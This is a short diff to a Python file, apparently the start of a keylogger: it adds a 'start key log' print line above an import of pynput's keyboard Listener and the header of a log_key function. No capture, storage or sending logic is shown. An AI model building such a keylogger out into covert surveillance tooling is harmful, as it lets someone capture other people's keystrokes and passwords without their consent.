@@ -1,3 +1,5 @@
+print("start key log")
+
 from pynput.keyboard import Listener
 
 def log_key(key):# Function to log the key that was pressed
